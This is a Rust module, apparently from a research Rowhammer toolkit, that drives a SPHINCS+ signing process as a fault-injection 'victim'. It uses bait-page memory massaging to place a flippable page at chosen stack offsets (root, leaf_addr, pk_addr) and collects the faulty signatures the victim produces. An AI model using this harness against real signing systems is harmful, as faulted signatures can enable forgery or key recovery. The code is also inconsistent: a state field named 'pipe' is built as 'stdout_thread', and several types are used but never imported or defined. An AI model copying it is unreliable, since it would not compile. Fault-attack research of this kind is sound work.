use itertools::Itertools;
use libc::sched_getcpu;
use serde::Serialize;
use sha2::{Digest, Sha256};
use std::{
    collections::HashMap,
    io::{BufRead, BufReader, Write},
    mem,
    os::fd::{FromRawFd, OwnedFd},
    process::ChildStdout,
    thread,
    time::Duration,
};

use crate::{
    memory::{find_flippy_page, PfnResolver},
    util::PAGE_SIZE,
};

use super::{HammerVictim, HammerVictimError, InjectionConfig, PageInjector, VictimResult};

#[derive(Serialize)]
enum State {
    Init {
        binary: String,
        injection_config: InjectionConfig,
    },
    Running {
        target: String,
        #[serde(skip_serializing)]
        child: std::process::Child,
        #[serde(skip_serializing)]
        pipe: PipeIPC<ChildStdout, ChildStdin>,
        #[serde(skip_serializing)]
        stderr_logger: Option<thread::JoinHandle<()>>,
        target_pfn: u64,
        region_offset: usize,
    },
    Stopped,
}

#[derive(Serialize)]
pub struct SphincsPlus {
    state: State,
}

impl SphincsPlus {
    pub fn target_addr(&self) -> *const libc::c_void {
        match &self.state {
            State::Init {
                injection_config, ..
            } => injection_config.target_addr as *const libc::c_void,
            _ => panic!("Invalid state"),
        }
    }
}

fn set_process_affinity(pid: libc::pid_t, core_id: usize) {
    use libc::{cpu_set_t, sched_setaffinity, CPU_SET, CPU_ZERO};

    unsafe {
        let mut cpuset: cpu_set_t = std::mem::zeroed();
        CPU_ZERO(&mut cpuset);
        CPU_SET(core_id, &mut cpuset);

        let result = sched_setaffinity(pid, std::mem::size_of::<cpu_set_t>(), &cpuset);
        if result != 0 {
            eprintln!(
                "Failed to set process affinity: {}",
                std::io::Error::last_os_error()
            );
        }
    }
}

fn get_current_core() -> usize {
    unsafe {
        let core_id = sched_getcpu();
        if core_id < 0 {
            panic!(
                "Failed to get current core: {}",
                std::io::Error::last_os_error()
            );
        } else {
            core_id as usize
        }
    }
}

#[derive(Debug, Serialize)]
pub struct StackProcessHammerResult {
    pipe_response: String,
    pub signatures: Vec<String>,
}

const KEYS_FILE: &str = "keys.txt";
const SIGS_FILE: &str = "sigs.txt";

// find profile entry with bitflips in needed range
#[derive(Clone, Debug, Serialize)]
struct TargetOffset {
    description: String,
    page_offset: usize,
    stack_offset: usize,
    target_size: usize,
}
fn filter_addrs(addrs: Vec<usize>, targets: &[TargetOffset]) -> Vec<(usize, TargetOffset)> {
    addrs
        .into_iter()
        .filter_map(|addr| {
            let pg_offset = addr & 0xfff;
            let matched = targets.iter().find(|&target| {
                let addr = target.page_offset & 0xfff;
                addr <= pg_offset && pg_offset < addr + target.target_size
            });
            if matched.is_some() {
                info!("Matched addr {:?} to target {:?}", addr, matched);
            }
            matched.map(|offset| (addr, offset.clone()))
        })
        .collect_vec()
}

fn find_injectable_page(addrs: Vec<usize>) -> Option<InjectionConfig> {
    let targets = [
        // attack root[SPX_N] for 256s
        TargetOffset {
            description: "root[SPX_N] 256s".to_string(),
            page_offset: 0xec0,
            stack_offset: 31,
            target_size: 32,
        },
        // attack stack for 256s
        TargetOffset {
            description: "stack 256s".to_string(),
            page_offset: 0x700,
            stack_offset: 31,
            target_size: 448,
        },
        // attack stack for 256s
        TargetOffset {
            description: "stack 256s".to_string(),
            page_offset: 0xa10,
            stack_offset: 31,
            target_size: 256,
        },
        // attack leaf_addr (22 byte) for 256s
        TargetOffset {
            description: "leaf_addr 256s".to_string(),
            page_offset: 0xc68,
            stack_offset: 31,
            target_size: 22,
        },
        // attack pk_addr (22 byte) for 256s
        TargetOffset {
            description: "pk_addr 256s".to_string(),
            page_offset: 0xc48,
            stack_offset: 31,
            target_size: 22,
        },
    ];
    // the number of bait pages to release after the target page (for memory massaging)
    let bait_count_after = HashMap::from([(29, 0), (30, 26), (31, 7), (32, 28)]);

    // just put the page at offset 31
    Some(InjectionConfig {
        target_addr: addrs.first().copied().unwrap(),
        flippy_page_size: PAGE_SIZE,
        bait_count_after: bait_count_after.get(&31).copied().unwrap(),
        bait_count_before: 0,
        stack_offset: 31,
    })
    /*
    filter_addrs(addrs, &targets)
        .first()
        .map(|f| InjectionConfig {
            target_addr: f.0,
            flippy_page_size: PAGE_SIZE,
            bait_count_after: bait_count_after
                .get(&f.1.stack_offset)
                .copied()
                .expect("unsupported stack offset"),
            bait_count_before: 0,
            stack_offset: f.1.stack_offset,
        })*/
}

impl SphincsPlus {
    /// Create a new `SphincsPlus` victim.
    ///
    /// # Arguments
    /// - `binary`: The path to the target binary.
    /// - `keys_path`: The path to the keys.
    /// - `sigs_path`: The output path to the signatures.
    /// - `injection_config`: The injection configuration.
    pub fn new(binary: String, addrs: Vec<usize>) -> anyhow::Result<Self> {
        let injection_config = find_injectable_page(addrs)
            .ok_or_else(|| anyhow::anyhow!("No page suitable for injection found"))?;
        Ok(Self {
            state: State::Init {
                binary,
                injection_config,
            },
        })
    }

    pub fn new_with_config(
        binary: String,
        injection_config: InjectionConfig,
    ) -> anyhow::Result<Self> {
        Ok(Self {
            state: State::Init {
                binary,
                injection_config,
            },
        })
    }

    pub fn pid(&self) -> Option<u32> {
        match self.state {
            State::Running { ref child, .. } => Some(child.id()),
            _ => None,
        }
    }
}

pub fn spawn_reader_thread(
    mut pipe: ChildStdout,
) -> thread::JoinHandle<(Vec<String>, ChildStdout)> {
    thread::spawn(move || {
        let reader = BufReader::new(&mut pipe);
        let mut lines = Vec::new();
        let mut prev_empty = false;

        for line in reader.lines() {
            match line {
                Ok(line) => {
                    let next_empty = line.is_empty();
                    if prev_empty && next_empty {
                        break;
                    }
                    if !next_empty {
                        lines.push(line);
                    }
                    prev_empty = next_empty;
                }
                Err(e) => {
                    error!("Error reading line from child process: {}", e);
                    break;
                }
            }
        }

        (lines, pipe) // Return both the collected lines and the pipe
    })
}

impl HammerVictim for SphincsPlus {
    fn start(&mut self) -> Result<(), HammerVictimError> {
        match &self.state {
            State::Init {
                binary,
                injection_config,
            } => {
                if std::path::Path::new(SIGS_FILE).exists() {
                    std::fs::remove_file(SIGS_FILE).expect("Failed to delete sigs.txt");
                }
                set_process_affinity(unsafe { libc::getpid() }, get_current_core());
                let mut cmd = std::process::Command::new("taskset");
                cmd.arg("-c").arg(get_current_core().to_string());
                cmd.arg(binary);
                cmd.arg(KEYS_FILE);
                cmd.arg(SIGS_FILE);
                cmd.stdin(std::process::Stdio::piped());
                cmd.stdout(std::process::Stdio::piped());
                cmd.stderr(std::process::Stdio::piped());
                let page_injector = PageInjector::new(*injection_config);
                let target_pfn = (injection_config.target_addr as *const libc::c_void)
                    .pfn()
                    .expect("PFN resolve failed");
                let mut child = page_injector.inject(cmd).expect("Failed to inject page");
                info!("Victim launched");

                // Log victim stderr
                let stderr_logger = if let Some(stderr) = child.stderr.take() {
                    let reader = BufReader::new(stderr);

                    // Spawn a thread to handle logging from stderr
                    let handle = thread::spawn(move || {
                        for line in reader.lines() {
                            match line {
                                Ok(log_line) => {
                                    info!("{}", log_line);
                                }
                                Err(err) => {
                                    error!("Error reading line from child process: {}", err)
                                }
                            }
                        }
                    });
                    Some(handle)
                } else {
                    eprintln!("Failed to capture stderr");
                    child.kill().expect("kill");
                    child.wait().expect("wait");
                    None
                };

                // Pin the child to the next core
                let num_cores = unsafe { libc::sysconf(libc::_SC_NPROCESSORS_ONLN) };
                let target_core = (get_current_core() + 1) % num_cores as usize;
                let cid = child.id();
                info!("Pinning procees {} to core {}", cid, target_core);
                set_process_affinity(cid as libc::pid_t, target_core);

                // Create a pipe for IPC
                let stdout_thread = spawn_reader_thread(child.stdout.take().expect("stdout"));
                self.state = State::Running {
                    target: binary.clone(),
                    child,
                    stdout_thread,
                    stderr_logger,
                    target_pfn,
                    region_offset: injection_config.stack_offset,
                };

                // find flippy page
                thread::sleep(Duration::from_millis(100)); // wait before checking for flippy page, as victim might need some time to allocate the stack
                if let Err(e) = self.check_flippy_page_exists() {
                    error!("Failed to find flippy page: {:?}", e);
                    self.stop();
                    Err(e)
                } else {
                    Ok(())
                }
            }
            _ => Err(HammerVictimError::NotRunning),
        }
    }
    fn init(&mut self) {}

    fn check(&mut self) -> Result<VictimResult, HammerVictimError> {
        match &mut self.state {
            State::Running { pipe, .. } => {
                pipe.wait_for("press enter to start check".to_string())?;
                pipe.send(b'\n')?;
                let resp: String = pipe.receive().map_err(HammerVictimError::IoError)?;
                if resp.starts_with("FLIPPED") {
                    let file = File::open(SIGS_FILE).map_err(HammerVictimError::IoError)?;
                    let reader = BufReader::new(file);
                    let signatures: Vec<String> =
                        reader.lines().collect::<Result<_, _>>().unwrap_or_default();
                    Ok(VictimResult::SphincsPlus {
                        signatures,
                        child_output: resp,
                    })
                } else {
                    Err(HammerVictimError::NoFlips)
                }
            }
            _ => Err(HammerVictimError::NotRunning),
        }
    }

    fn stop(&mut self) {
        if let State::Running {
            child,
            stderr_logger,
            ..
        } = &mut self.state
        {
            child.kill().expect("kill");
            child.wait().expect("wait");
            if let Some(stderr_logger) = stderr_logger.take() {
                stderr_logger.join().expect("join");
            }
            self.state = State::Stopped;
        }
    }
}

impl SphincsPlus {
    fn check_flippy_page_exists(&self) -> Result<(), HammerVictimError> {
        if let State::Running {
            child,
            target_pfn,
            region_offset,
            ..
        } = &self.state
        {
            let flippy_page = find_flippy_page(*target_pfn, child.id());
            match flippy_page {
                Ok(Some(flippy_page)) => {
                    info!("Flippy page found: {:?}", flippy_page);
                    if flippy_page.region_offset != *region_offset {
                        warn!(
                            "Flippy page offset mismatch: {} != {}",
                            flippy_page.region_offset, region_offset
                        );
                        return Err(HammerVictimError::FlippyPageOffsetMismatch {
                            expected: *region_offset,
                            actual: flippy_page,
                        });
                    }
                    return Ok(());
                }
                Ok(None) => {
                    return Err(HammerVictimError::FlippyPageNotFound);
                }
                Err(e) => return Err(HammerVictimError::PageMapError(e)),
            }
        }
        Err(HammerVictimError::NotRunning)
    }
}

impl State {
    fn description(&self) -> String {
        match self {
            State::Init { binary, .. } => format!("Initializing {}", binary),
            State::Running { target, .. } => format!("Running {}", target),
            State::Stopped => "Stopped".to_string(),
        }
    }
}
#[cfg(test)]
mod tests {
    use std::ptr::null_mut;

    use crate::{
        allocator::util::mmap,
        util::PAGE_SIZE,
        victim::{
            sphincs_plus::{self, filter_addrs, TargetOffset},
            HammerVictim,
        },
    };

    #[test]
    fn test_sphincs_plus() -> anyhow::Result<()> {
        let ptr = mmap(null_mut(), PAGE_SIZE) as *const libc::c_void;
        let mut stack_process = super::SphincsPlus::new(
            "/home/jb/sphincsplus/ref/test/server".to_string(),
            vec![ptr as usize],
        )?;
        for _ in 0..10 {
            stack_process.init();
            let resp = stack_process.check();
            assert!(
                matches!(resp, Err(sphincs_plus::HammerVictimError::NoFlips),),
                "{:?}",
                resp
            );
        }
        Ok(())
    }

    #[test]
    fn test_filter_addrs_match_start() {
        let addrs = vec![0x700];
        let targets = [TargetOffset {
            description: "test_filter_flips_match_start".to_string(),
            page_offset: 0x700,
            stack_offset: 31,
            target_size: 32,
        }];
        let filtered = filter_addrs(addrs, &targets);
        assert_eq!(filtered.len(), 1);
    }

    #[test]
    fn test_filter_addrs_match_end() {
        let addrs = vec![0x700];
        let target = TargetOffset {
            description: "test_filter_flips_match_end".to_string(),
            page_offset: 0x600,
            stack_offset: 31,
            target_size: 0x101,
        };
        let filtered = filter_addrs(addrs, &[target]);
        assert_eq!(filtered.len(), 1);
    }

    #[test]
    fn test_filter_addrs_nomatch() {
        let addrs = vec![0x700];
        let target = TargetOffset {
            description: "test_filter_flips_nomatch".to_string(),
            page_offset: 0x600,
            stack_offset: 31,
            target_size: 0x100,
        };
        let filtered = filter_addrs(addrs, &[target]);
        assert_eq!(filtered.len(), 0);
    }
}
